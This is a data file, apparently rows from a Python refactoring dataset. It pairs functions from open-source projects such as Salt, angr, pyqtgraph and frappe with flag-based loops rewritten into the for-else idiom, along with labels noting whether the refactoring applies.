        :param handler_input: generic input to the dispatcher containing
            incoming request and other context.
        :type handler_input: Input
        :return: Output from the 'handle' method execution of the
            supporting handler.
        :rtype: Union[None, Output]
        :raises DispatchException if there is no supporting
            handler chain or adapter
        """"""
        request_handler_chain = None
        for mapper in self.request_mappers:
            request_handler_chain = mapper.get_request_handler_chain(
                handler_input)
            if request_handler_chain is not None:
                break

        if request_handler_chain is None:
            raise DispatchException(
                ""Unable to find a suitable request handler"")

        request_handler = request_handler_chain.request_handler
        supported_handler_adapter = None
        for adapter in self.handler_adapters:
            if adapter.supports(request_handler):
                supported_handler_adapter = adapter
                break

        if supported_handler_adapter is None:
            raise DispatchException(
                ""Unable to find a suitable request adapter"")

        local_request_interceptors = request_handler_chain.request_interceptors
        for interceptor in local_request_interceptors:
            interceptor.process(handler_input=handler_input)

        output = supported_handler_adapter.execute(
            handler_input=handler_input, handler=request_handler)  # type: Union[Output, None]

        local_response_interceptors = (
            request_handler_chain.response_interceptors)
        for response_interceptor in local_response_interceptors:
            response_interceptor.process(
                handler_input=handler_input, response=output)

        return output","for adapter in self.handler_adapters:
    if adapter.supports(request_handler):
        supported_handler_adapter = adapter
        break
if supported_handler_adapter is None:
    raise DispatchException('Unable to find a suitable request adapter')","for adapter in self.handler_adapters:
    if adapter.supports(request_handler):
        supported_handler_adapter = adapter
        break
else:
    raise DispatchException('Unable to find a suitable request adapter')",Cannot refactor,-1,"for adapter in self.handler_adapters:
    if adapter.supports(request_handler):
        supported_handler_adapter = adapter
        break
if supported_handler_adapter is None:
    raise DispatchException('Unable to find a suitable request adapter')","break statement is executed:None
break statement is not executed:zejun1"
maro,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/maro/maro/cli/grass/lib/services/master_agent/agent.py,https://github.com/microsoft/maro/tree/master/maro/cli/grass/lib/services/master_agent/agent.py,ResourceController,_get_single_metric_balanced_allocation_plan$922,"def _get_single_metric_balanced_allocation_plan(
        allocation_details: dict,
        required_resources: list,
        free_resources: list,
    ) -> dict:
        """"""Get single_metric_balanced allocation plan.

        The strategy uses a specific metric as the priority,
        then use a greedy approach to match the container to the available node
        with the largest remaining free resource.

        Args:
            allocation_details (dict): Details of allocation config.
            required_resources (list): List of ContainerResource.
            free_resources (list): List of NodeResource.

        Returns:
            dict[str, str]: container_name to node_name mapping.
        """"""
        # Init params.
        allocation_plan = {}
        if ""metric"" not in allocation_details or allocation_details[""metric""].lower() not in AVAILABLE_METRICS:
            raise ResourceAllocationFailed(""Invalid allocation parameter: metric"")
        metric = allocation_details[""metric""].lower()

        # Init resources PQ.
        required_resources_pq = []
        for required_resource in required_resources:
            heapq.heappush(
                required_resources_pq,
                (-getattr(required_resource, metric), required_resource),
            )
        free_resources_pq = []
        for free_resource in free_resources:
            heapq.heappush(
                free_resources_pq,
                (-getattr(free_resource, metric), free_resource),
            )

        # Get allocation.
        while len(required_resources_pq) > 0:
            # Get list, not tuple.
            required_resource = heapq.heappop(required_resources_pq)[1]

            not_usable_free_resources = []
            is_allocated = False
            free_resource = None
            while len(free_resources_pq) > 0:
                # Get list, not tuple.
                free_resource = heapq.heappop(free_resources_pq)[1]
                if free_resource >= required_resource:
                    is_allocated = True
                    break
                else:
                    not_usable_free_resources.append(free_resource)

            # Do allocation or return error.
            if is_allocated:
                allocation_plan[required_resource.container_name] = free_resource.node_name
                free_resource.cpu -= required_resource.cpu
                free_resource.memory -= required_resource.memory
                free_resource.gpu -= required_resource.gpu
                heapq.heappush(
                    free_resources_pq,
                    (-getattr(free_resource, metric), free_resource),
                )
                for not_usable_free_resource in not_usable_free_resources:
                    heapq.heappush(
                        free_resources_pq,
                        (-getattr(not_usable_free_resource, metric), not_usable_free_resource),
                    )
            else:
                # add previous resources back, to do printing.
                for not_usable_free_resource in not_usable_free_resources:
                    heapq.heappush(
                        free_resources_pq,
                        (-getattr(not_usable_free_resource, metric), not_usable_free_resource),
                    )
                heapq.heappush(
                    required_resources_pq,
                    (-getattr(required_resource, metric), required_resource),
                )

                logger.warning(allocation_plan)
                logger.warning(required_resources_pq)
                logger.warning(free_resources_pq)
                raise ResourceAllocationFailed(""Unable to allocate, Abort"")

        logger.info(required_resources)
        logger.info(free_resources)
        return allocation_plan","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        is_allocated = True
        break
    else:
        not_usable_free_resources.append(free_resource)
if is_allocated:
    allocation_plan[required_resource.container_name] = free_resource.node_name
    free_resource.cpu -= required_resource.cpu
    free_resource.memory -= required_resource.memory
    free_resource.gpu -= required_resource.gpu
    heapq.heappush(free_resources_pq, (-getattr(free_resource, metric), free_resource))
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        allocation_plan[required_resource.container_name] = free_resource.node_name
        free_resource.cpu -= required_resource.cpu
        free_resource.memory -= required_resource.memory
        free_resource.gpu -= required_resource.gpu
        heapq.heappush(free_resources_pq, (-getattr(free_resource, metric), free_resource))
        for not_usable_free_resource in not_usable_free_resources:
            heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
        break
    else:
        not_usable_free_resources.append(free_resource)
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        allocation_plan[required_resource.container_name] = free_resource.node_name
        free_resource.cpu -= required_resource.cpu
        free_resource.memory -= required_resource.memory
        free_resource.gpu -= required_resource.gpu
        heapq.heappush(free_resources_pq, (-getattr(free_resource, metric), free_resource))
        for not_usable_free_resource in not_usable_free_resources:
            heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
        break
    else:
        not_usable_free_resources.append(free_resource)
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')",1,"while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        is_allocated = True
        break
    else:
        not_usable_free_resources.append(free_resource)
if is_allocated:
    allocation_plan[required_resource.container_name] = free_resource.node_name
    free_resource.cpu -= required_resource.cpu
    free_resource.memory -= required_resource.memory
    free_resource.gpu -= required_resource.gpu
    heapq.heappush(free_resources_pq, (-getattr(free_resource, metric), free_resource))
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (-getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","break statement is executed:zejun1
break statement is not executed:None"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/states/bigip.py,https://github.com/saltstack/salt/tree/master/salt/states/bigip.py,,add_pool_member$1394,"def add_pool_member(hostname, username, password, name, member):
    """"""
    A function to connect to a bigip device and add a new member to an existing pool.

    hostname
        The host/address of the bigip device
    username
        The iControl REST username
    password
        The iControl REST password
    name
        The name of the pool to modify
    member
        The member to add to the pool
    """"""

    ret = {""name"": name, ""changes"": {}, ""result"": False, ""comment"": """"}

    if __opts__[""test""]:
        return _test_output(
            ret,
            ""add"",
            params={
                ""hostname"": hostname,
                ""username"": username,
                ""password"": password,
                ""name"": name,
                ""members"": member,
            },
        )

    # is this pool member currently configured?
    existing_pool = __salt__[""bigip.list_pool""](hostname, username, password, name)

    if existing_pool[""code""] == 200:

        # for some reason iControl REST doesn't support listing a single pool member.
        # the response from GET for listing a member will return 200 even if it doesn't exists.
        # because of this we have to do some rather ""unnecessary"" searching within a pool.

        # what are the current members?
        current_members = existing_pool[""content""][""membersReference""][""items""]

        # loop through them
        exists = False
        for current_member in current_members:
            if current_member[""name""] == member[""name""]:
                exists = True
                break

        if exists:
            ret[""result""] = True
            ret[
                ""comment""
            ] = ""Member: {name} already exists within this pool.  No changes made."".format(
                name=member[""name""]
            )
            ret[""changes""][""old""] = {}
            ret[""changes""][""new""] = {}
        else:
            new_member = __salt__[""bigip.add_pool_member""](
                hostname, username, password, name, member
            )

            if new_member[""code""] == 200:
                ret[""result""] = True
                ret[
                    ""comment""
                ] = ""Member: {name} has been successfully added to the pool."".format(
                    name=member[""name""]
                )
                ret[""changes""][""old""] = {}

                # look up the member again...
                pool_listing = __salt__[""bigip.list_pool""](
                    hostname, username, password, name
                )

                if pool_listing[""code""] != 200:
                    ret = _load_result(new_member, ret)
                    return ret

                members = pool_listing[""content""][""membersReference""][""items""]
                # loop through them
                for current_member in members:
                    if current_member[""name""] == member[""name""]:
                        added_member = current_member
                        break

                ret[""changes""][""new""] = added_member

            # member wasn't added
            else:
                ret = _load_result(new_member, ret)

    # pool does not exists
    elif existing_pool[""code""] == 404:
        ret[""comment""] = ""A pool with this name was not found.""
    else:
        ret = _load_result(existing_pool, ret)

    return ret","for current_member in current_members:
    if current_member['name'] == member['name']:
        exists = True
        break
if exists:
    ret['result'] = True
    ret['comment'] = 'Member: {name} already exists within this pool.  No changes made.'.format(name=member['name'])
    ret['changes']['old'] = {}
    ret['changes']['new'] = {}
else:
    new_member = __salt__['bigip.add_pool_member'](hostname, username, password, name, member)
    if new_member['code'] == 200:
        ret['result'] = True
        ret['comment'] = 'Member: {name} has been successfully added to the pool.'.format(name=member['name'])
        ret['changes']['old'] = {}
        pool_listing = __salt__['bigip.list_pool'](hostname, username, password, name)
        if pool_listing['code'] != 200:
            ret = _load_result(new_member, ret)
            return ret
        members = pool_listing['content']['membersReference']['items']
        for current_member in members:
            if current_member['name'] == member['name']:
                added_member = current_member
                break
        ret['changes']['new'] = added_member
    else:
        ret = _load_result(new_member, ret)","for current_member in current_members:
    if current_member['name'] == member['name']:
        ret['result'] = True
        ret['comment'] = 'Member: {name} already exists within this pool.  No changes made.'.format(name=member['name'])
        ret['changes']['old'] = {}
        ret['changes']['new'] = {}
        break
else:
    new_member = __salt__['bigip.add_pool_member'](hostname, username, password, name, member)
    if new_member['code'] == 200:
        ret['result'] = True
        ret['comment'] = 'Member: {name} has been successfully added to the pool.'.format(name=member['name'])
        ret['changes']['old'] = {}
        pool_listing = __salt__['bigip.list_pool'](hostname, username, password, name)
        if pool_listing['code'] != 200:
            ret = _load_result(new_member, ret)
            return ret
        members = pool_listing['content']['membersReference']['items']
        for current_member in members:
            if current_member['name'] == member['name']:
                added_member = current_member
                break
        ret['changes']['new'] = added_member
    else:
        ret = _load_result(new_member, ret)","for current_member in current_members:
    if current_member['name'] == member['name']:
        ret['result'] = True
        ret['comment'] = 'Member: {name} already exists within this pool.  No changes made.'.format(name=member['name'])
        ret['changes']['old'] = {}
        ret['changes']['new'] = {}
        break
else:
    new_member = __salt__['bigip.add_pool_member'](hostname, username, password, name, member)
    if new_member['code'] == 200:
        ret['result'] = True
        ret['comment'] = 'Member: {name} has been successfully added to the pool.'.format(name=member['name'])
        ret['changes']['old'] = {}
        pool_listing = __salt__['bigip.list_pool'](hostname, username, password, name)
        if pool_listing['code'] != 200:
            ret = _load_result(new_member, ret)
            return ret
        members = pool_listing['content']['membersReference']['items']
        for current_member in members:
            if current_member['name'] == member['name']:
                added_member = current_member
                break
        ret['changes']['new'] = added_member
    else:
        ret = _load_result(new_member, ret)",1,"for current_member in current_members:
    if current_member['name'] == member['name']:
        exists = True
        break
if exists:
    ret['result'] = True
    ret['comment'] = 'Member: {name} already exists within this pool.  No changes made.'.format(name=member['name'])
    ret['changes']['old'] = {}
    ret['changes']['new'] = {}
else:
    new_member = __salt__['bigip.add_pool_member'](hostname, username, password, name, member)
    if new_member['code'] == 200:
        ret['result'] = True
        ret['comment'] = 'Member: {name} has been successfully added to the pool.'.format(name=member['name'])
        ret['changes']['old'] = {}
        pool_listing = __salt__['bigip.list_pool'](hostname, username, password, name)
        if pool_listing['code'] != 200:
            ret = _load_result(new_member, ret)
            return ret
        members = pool_listing['content']['membersReference']['items']
        for current_member in members:
            if current_member['name'] == member['name']:
                added_member = current_member
                break
        ret['changes']['new'] = added_member
    else:
        ret = _load_result(new_member, ret)","break statement is executed:zejun1
break statement is not executed:None"
pyqtgraph,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyqtgraph/pyqtgraph/parametertree/Parameter.py,https://github.com/pyqtgraph/pyqtgraph/tree/master/pyqtgraph/parametertree/Parameter.py,Parameter,restoreState$363,"def restoreState(self, state, recursive=True, addChildren=True, removeChildren=True, blockSignals=True):
        """"""
        Restore the state of this parameter and its children from a structure generated using saveState()
        If recursive is True, then attempt to restore the state of child parameters as well.
        If addChildren is True, then any children which are referenced in the state object will be
        created if they do not already exist.
        If removeChildren is True, then any children which are not referenced in the state object will 
        be removed.
        If blockSignals is True, no signals will be emitted until the tree has been completely restored. 
        This prevents signal handlers from responding to a partially-rebuilt network.
        """"""
        state = state.copy()
        childState = state.pop('children', [])
        
        ## list of children may be stored either as list or dict.
        if isinstance(childState, dict):
            cs = []
            for k,v in childState.items():
                cs.append(v.copy())
                cs[-1].setdefault('name', k)
            childState = cs
        
        if blockSignals:
            self.blockTreeChangeSignal()
            
        try:
            self.setOpts(**state)
            
            if not recursive:
                return
            
            ptr = 0  ## pointer to first child that has not been restored yet
            foundChilds = set()
            #print ""=============="", self.name()
            
            for ch in childState:
                name = ch['name']
                #typ = ch.get('type', None)
                #print('child: %s, %s' % (self.name()+'.'+name, typ))
                
                ## First, see if there is already a child with this name
                gotChild = False
                for i, ch2 in enumerate(self.childs[ptr:]):
                    #print ""  "", ch2.name(), ch2.type()
                    if ch2.name() != name: # or not ch2.isType(typ):
                        continue
                    gotChild = True
                    #print ""    found it""
                    if i != 0:  ## move parameter to next position
                        #self.removeChild(ch2)
                        self.insertChild(ptr, ch2)
                        #print ""  moved to position"", ptr
                    ch2.restoreState(ch, recursive=recursive, addChildren=addChildren, removeChildren=removeChildren)
                    foundChilds.add(ch2)
                    
                    break
                
                if not gotChild:
                    if not addChildren:
                        #print ""  ignored child""
                        continue
                    #print ""    created new""
                    ch2 = Parameter.create(**ch)
                    self.insertChild(ptr, ch2)
                    foundChilds.add(ch2)
                    
                ptr += 1
                
            if removeChildren:
                for ch in self.childs[:]:
                    if ch not in foundChilds:
                        #print ""  remove:"", ch
                        self.removeChild(ch)
        finally:
            if blockSignals:
                self.unblockTreeChangeSignal()","for (i, ch2) in enumerate(self.childs[ptr:]):
    if ch2.name() != name:
        continue
    gotChild = True
    if i != 0:
        self.insertChild(ptr, ch2)
    ch2.restoreState(ch, recursive=recursive, addChildren=addChildren, removeChildren=removeChildren)
    foundChilds.add(ch2)
    break
if not gotChild:
    if not addChildren:
        continue
    ch2 = Parameter.create(**ch)
    self.insertChild(ptr, ch2)
    foundChilds.add(ch2)","for (i, ch2) in enumerate(self.childs[ptr:]):
    if ch2.name() != name:
        continue
    if i != 0:
        self.insertChild(ptr, ch2)
    ch2.restoreState(ch, recursive=recursive, addChildren=addChildren, removeChildren=removeChildren)
    foundChilds.add(ch2)
    break
else:
    if not addChildren:
        continue
    ch2 = Parameter.create(**ch)
    self.insertChild(ptr, ch2)
    foundChilds.add(ch2)","for (i, ch2) in enumerate(self.childs[ptr:]):
    if ch2.name() != name:
        continue
    if i != 0:
        self.insertChild(ptr, ch2)
    ch2.restoreState(ch, recursive=recursive, addChildren=addChildren, removeChildren=removeChildren)
    foundChilds.add(ch2)
    break
else:
    if not addChildren:
        continue
    ch2 = Parameter.create(**ch)
    self.insertChild(ptr, ch2)
    foundChilds.add(ch2)",1,"for (i, ch2) in enumerate(self.childs[ptr:]):
    if ch2.name() != name:
        continue
    gotChild = True
    if i != 0:
        self.insertChild(ptr, ch2)
    ch2.restoreState(ch, recursive=recursive, addChildren=addChildren, removeChildren=removeChildren)
    foundChilds.add(ch2)
    break
if not gotChild:
    if not addChildren:
        continue
    ch2 = Parameter.create(**ch)
    self.insertChild(ptr, ch2)
    foundChilds.add(ch2)","break statement is executed:None
break statement is not executed:zejun1"
angr,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/angr/angr/analyses/reassembler.py,https://github.com/angr/angr/tree/master/angr/analyses/reassembler.py,Reassembler,_initialize$2302,"def _initialize(self):
        """"""
        Initialize the binary.

        :return: None
        """"""

        # figure out section alignments
        for section in self.project.loader.main_object.sections:
            in_segment = False
            for segment in self.project.loader.main_object.segments:
                segment_addr = segment.vaddr
                if segment_addr <= section.vaddr < segment_addr + segment.memsize:
                    in_segment = True
                    break
            if not in_segment:
                continue

            # calculate alignments
            if section.vaddr % 0x20 == 0:
                alignment = 0x20
            elif section.vaddr % 0x10 == 0:
                alignment = 0x10
            elif section.vaddr % 0x8 == 0:
                alignment = 0x8
            elif section.vaddr % 0x4 == 0:
                alignment = 0x4
            else:
                alignment = 2

            self._section_alignments[section.name] = alignment

        l.debug('Generating CFG...')
        cfg = self.project.analyses.CFG(normalize=True, resolve_indirect_jumps=True, data_references=True,
                                        extra_memory_regions=[(0x4347c000, 0x4347c000 + 0x1000)],
                                        data_type_guessing_handlers=[
                                            self._sequence_handler,
                                            self._cgc_extended_application_handler,
                                            self._unknown_data_size_handler,
                                        ],
                                        )

        self.cfg = cfg

        old_capstone_syntax = self.project.arch.capstone_x86_syntax
        if old_capstone_syntax is None:
            old_capstone_syntax = 'intel'

        if self.syntax == 'at&t':
            # switch capstone to AT&T style
            self.project.arch.capstone_x86_syntax = ""at&t""
            # clear the block cache in lifter!
            self.project.factory.default_engine.clear_cache()

        # initialize symbol manager
        self.symbol_manager = SymbolManager(self, cfg)

        # collect address of all instructions
        l.debug('Collecting instruction addresses...')
        for cfg_node in self.cfg.nodes():
            self.all_insn_addrs |= set(cfg_node.instruction_addrs)

        # Functions

        l.debug('Creating functions...')
        for f in cfg.kb.functions.values():
            # Skip all SimProcedures
            if self.project.is_hooked(f.addr):
                continue
            elif self.project.simos.is_syscall_addr(f.addr):
                continue

            # Check which section the start address belongs to
            section = next(iter(sec.name for sec in self.project.loader.main_object.sections
                                if f.addr >= sec.vaddr and f.addr < sec.vaddr + sec.memsize
                                ),
                           "".text""
                           )

            if section in ('.got', '.plt', 'init', 'fini'):
                continue

            procedure = Procedure(self, f, section=section)
            self.procedures.append(procedure)

        self.procedures = sorted(self.procedures, key=lambda x: x.addr)

        # Data

        has_sections = len(self.project.loader.main_object.sections) > 0

        l.debug('Creating data entries...')
        for addr, memory_data in cfg._memory_data.items():

            if memory_data.sort in ('code reference', ):
                continue

            if memory_data.sort == 'string':
                # it might be the CGC package list
                new_sort, new_size = self._cgc_package_list_identifier(memory_data.address, memory_data.size)
                if new_sort is not None:
                    # oh we got it!
                    memory_data = memory_data.copy()
                    memory_data.sort = new_sort

            if has_sections:
                # Check which section the start address belongs to
                section = next(iter(sec for sec in self.project.loader.main_object.sections
                                    if sec.vaddr <= addr < sec.vaddr + sec.memsize
                                    ),
                               None
                               )

                if section is not None and section.name not in ('.note.gnu.build-id', ):  # ignore certain section names
                    data = Data(self, memory_data, section=section)
                    self.data.append(data)
                elif memory_data.sort == 'segment-boundary':
                    # it just points to the end of the segment or a section
                    section = next(iter(sec for sec in self.project.loader.main_object.sections
                                        if addr == sec.vaddr + sec.memsize),
                                   None
                                   )
                    if section is not None:
                        data = Data(self, memory_data, section=section)
                        self.data.append(data)

                else:
                    # data = Data(self, memory_data, section_name='.data')
                    # the data is not really within any existing section. weird. ignored it.
                    pass
            else:
                # the binary does not have any section
                # we use segment information instead
                # TODO: this logic needs reviewing
                segment = next(iter(seg for seg in self.project.loader.main_object.segments
                                    if seg.vaddr <= addr <= seg.vaddr + seg.memsize
                                    ),
                               None
                               )

                if segment is not None:
                    data = Data(self, memory_data, section_name='.data')
                    self.data.append(data)

        # remove all data that belong to GCC-specific sections
        section_names_to_ignore = {'.init', '.fini', '.fini_array', '.jcr', '.dynamic', '.got', '.got.plt',
                                   '.eh_frame_hdr', '.eh_frame', '.rel.dyn', '.rel.plt', '.rela.dyn', '.rela.plt',
                                   '.dynstr', '.dynsym', '.interp', '.note.ABI-tag', '.note.gnu.build-id', '.gnu.hash',
                                   '.gnu.version', '.gnu.version_r'
                                   }

        # make sure there are always memory data entries pointing at the end of sections
        all_data_addrs = set(d.addr for d in self.data)
        all_procedure_addrs = set(f.addr for f in self.procedures)
        all_addrs = all_data_addrs | all_procedure_addrs

        if has_sections:
            for section in self.project.loader.main_object.sections:

                if section.name in section_names_to_ignore:
                    # skip all sections that are CGC specific
                    continue

                # make sure this section is inside a segment
                for segment in self.project.loader.main_object.segments:
                    segment_start = segment.vaddr
                    segment_end = segment_start + segment.memsize
                    if segment_start <= section.vaddr < segment_end:
                        break
                else:
                    # this section is not mapped into memory
                    continue

                section_boundary_addr = section.vaddr + section.memsize
                if section_boundary_addr not in all_addrs:
                    data = Data(self, addr=section_boundary_addr, size=0, sort='segment-boundary',
                                section_name=section.name
                                )
                    self.data.append(data)
                    # add the address to all_data_addrs so we don't end up adding another boundary in
                    all_data_addrs.add(section_boundary_addr)

        self.data = sorted(self.data, key=lambda x: x.addr)

        data_indices_to_remove = set()

        # Go through data entry list and refine them
        for i, data in enumerate(self.data):

            if i in data_indices_to_remove:
                continue

            # process the overlapping ones
            if i < len(self.data) - 1:
                if data.addr + data.size > self.data[i + 1].addr:
                    # they are overlapping :-(

                    # TODO: make sure new_size makes sense
                    new_size = self.data[i + 1].addr - data.addr

                    # there are cases that legit data is misclassified as pointers
                    # we are able to detect some of them here
                    if data.sort == 'pointer-array':
                        pointer_size = self.project.arch.bytes
                        if new_size % pointer_size != 0:
                            # the self.data[i+1] cannot be pointed to by a pointer
                            # remove that guy later
                            data_indices_to_remove.add(i + 1)
                            # mark the source as a non-pointer
                            # apparently the original Reassembleable Disassembler paper cannot get this case
                            source_addr = self.data[i + 1].memory_data.pointer_addr
                            if source_addr is not None:
                                # find the original data
                                original_data = next((d for d in self.data if d.addr <= source_addr < d.addr + d.size),
                                                     None
                                                     )
                                if original_data is not None:
                                    original_data.desymbolize()

                            continue

                    data.shrink(new_size)

            # process those ones whose type is unknown
            if data.sort == 'unknown' and data.size == 0:
                # increase its size until reaching the next item

                if i + 1 == len(self.data):
                    if data.section is None:
                        continue
                    data.size = data.section.vaddr + data.section.memsize - data.addr
                else:
                    data.size = self.data[i + 1].addr - data.addr

        for i in sorted(data_indices_to_remove, reverse=True):
            self.data = self.data[ : i] + self.data[i + 1 : ]

        # CGC-specific data filtering
        self.data = [ d for d in self.data if d.section_name not in section_names_to_ignore ]

        # restore capstone X86 syntax at the end
        if self.project.arch.capstone_x86_syntax != old_capstone_syntax:
            self.project.arch.capstone_x86_syntax = old_capstone_syntax
            self.project.factory.default_engine.clear_cache()

        l.debug('Initialized.')","for segment in self.project.loader.main_object.segments:
    segment_addr = segment.vaddr
    if segment_addr <= section.vaddr < segment_addr + segment.memsize:
        in_segment = True
        break
if not in_segment:
    continue","for segment in self.project.loader.main_object.segments:
    segment_addr = segment.vaddr
    if segment_addr <= section.vaddr < segment_addr + segment.memsize:
        break
else:
    continue","for segment in self.project.loader.main_object.segments:
    segment_addr = segment.vaddr
    if segment_addr <= section.vaddr < segment_addr + segment.memsize:
        break
else:
    continue",1,"for segment in self.project.loader.main_object.segments:
    segment_addr = segment.vaddr
    if segment_addr <= section.vaddr < segment_addr + segment.memsize:
        in_segment = True
        break
if not in_segment:
    continue","break statement is executed:None
break statement is not executed:zejun1"
frappe,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/frappe/frappe/integrations/doctype/dropbox_settings/dropbox_settings.py,https://github.com/frappe/frappe/tree/master/frappe/integrations/doctype/dropbox_settings/dropbox_settings.py,,upload_from_folder$154,"def upload_from_folder(
	path, is_private, dropbox_folder, dropbox_client, did_not_upload, error_log
):
	if not os.path.exists(path):
		return

	if is_fresh_upload():
		response = get_uploaded_files_meta(dropbox_folder, dropbox_client)
	else:
		response = frappe._dict({""entries"": []})

	path = str(path)

	for f in frappe.get_all(
		""File"",
		filters={""is_folder"": 0, ""is_private"": is_private, ""uploaded_to_dropbox"": 0},
		fields=[""file_url"", ""name"", ""file_name""],
	):
		if not f.file_url:
			continue
		filename = f.file_url.rsplit(""/"", 1)[-1]

		filepath = os.path.join(path, filename)

		if filename in ignore_list:
			continue

		found = False
		for file_metadata in response.entries:
			try:
				if os.path.basename(filepath) == file_metadata.name and os.stat(
					encode(filepath)
				).st_size == int(file_metadata.size):
					found = True
					update_file_dropbox_status(f.name)
					break
			except Exception:
				error_log.append(frappe.get_traceback())

		if not found:
			try:
				upload_file_to_dropbox(filepath, dropbox_folder, dropbox_client)
				update_file_dropbox_status(f.name)
			except Exception:
				did_not_upload.append(filepath)
				error_log.append(frappe.get_traceback())","for file_metadata in response.entries:
    try:
        if os.path.basename(filepath) == file_metadata.name and os.stat(encode(filepath)).st_size == int(file_metadata.size):
            found = True
            update_file_dropbox_status(f.name)
            break
    except Exception:
        error_log.append(frappe.get_traceback())
if not found:
    try:
        upload_file_to_dropbox(filepath, dropbox_folder, dropbox_client)
        update_file_dropbox_status(f.name)
    except Exception:
        did_not_upload.append(filepath)
        error_log.append(frappe.get_traceback())","for file_metadata in response.entries:
    try:
        if os.path.basename(filepath) == file_metadata.name and os.stat(encode(filepath)).st_size == int(file_metadata.size):
            update_file_dropbox_status(f.name)
            break
    except Exception:
        error_log.append(frappe.get_traceback())
else:
    try:
        upload_file_to_dropbox(filepath, dropbox_folder, dropbox_client)
        update_file_dropbox_status(f.name)
    except Exception:
        did_not_upload.append(filepath)
        error_log.append(frappe.get_traceback())","for file_metadata in response.entries:
    try:
        if os.path.basename(filepath) == file_metadata.name and os.stat(encode(filepath)).st_size == int(file_metadata.size):
            update_file_dropbox_status(f.name)
            break
    except Exception:
        error_log.append(frappe.get_traceback())
else:
    try:
        upload_file_to_dropbox(filepath, dropbox_folder, dropbox_client)
        update_file_dropbox_status(f.name)
    except Exception:
        did_not_upload.append(filepath)
        error_log.append(frappe.get_traceback())",1,"for file_metadata in response.entries:
    try:
        if os.path.basename(filepath) == file_metadata.name and os.stat(encode(filepath)).st_size == int(file_metadata.size):
            found = True
            update_file_dropbox_status(f.name)
            break
    except Exception:
        error_log.append(frappe.get_traceback())
if not found:
    try:
        upload_file_to_dropbox(filepath, dropbox_folder, dropbox_client)
        update_file_dropbox_status(f.name)
    except Exception:
        did_not_upload.append(filepath)
        error_log.append(frappe.get_traceback())","break statement is executed:None
break statement is not executed:zejun1"
kawaii-player,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/kawaii-player/kawaii_player/vinanti/req_urllib.py,https://github.com/kanishka-linux/kawaii-player/tree/master/kawaii_player/vinanti/req_urllib.py,ResponseUrllib,set_information$145,"def set_information(self, req, parent):
        self.info = req.info()
        self.url = req.geturl()
        self.status = req.getcode()
        self.content_encoding = self.info.get('content-encoding')
        self.content_type = self.info.get('content-type')
        
        if not self.content_type:
            self.content_type = 'Not Available'
        else:
            charset_s = re.search('charset[^;]*', self.content_type.lower())
            if charset_s:
                charset_t = charset_s.group()
                charset_t = charset_t.replace('charset=', '')
                self.charset = charset_t.strip()
        if parent.charset:
            self.charset = parent.charset
        
        self.readable_format = [
            'text/plain', 'text/html', 'text/css', 'text/javascript',
            'application/xhtml+xml', 'application/xml', 'application/json',
            'application/javascript', 'application/ecmascript'
            ]
        human_readable = False
        for i in self.readable_format:
            if i in self.content_type.lower():
                human_readable = True
                break
        if not human_readable:
            self.binary = True
        dstorage = None
        if self.content_encoding == 'gzip':
            try:
                storage = BytesIO(req.read())
                dstorage = gzip.GzipFile(fileobj=storage)
            except Exception as err:
                logger.error(err)
                
        if parent.method == 'HEAD':
            self.html = 'None'
        elif parent.out:
            if parent.continue_out:
                mode = 'ab'
            else:
                mode = 'wb'
            with open(parent.out, mode) as out_file:
                if dstorage is None:
                    shutil.copyfileobj(req, out_file)
                else:
                    shutil.copyfileobj(dstorage, out_file)
            self.html = 'file saved to:: {}'.format(parent.out)
        else:
            self.read_html(parent, req, dstorage, human_readable)","for i in self.readable_format:
    if i in self.content_type.lower():
        human_readable = True
        break
if not human_readable:
    self.binary = True","for i in self.readable_format:
    if i in self.content_type.lower():
        human_readable = True
        break
else:
    self.binary = True","for i in self.readable_format:
    if i in self.content_type.lower():
        human_readable = True
        break
else:
    self.binary = True",1,"for i in self.readable_format:
    if i in self.content_type.lower():
        human_readable = True
        break
if not human_readable:
    self.binary = True","break statement is executed:None
break statement is not executed:zejun1"
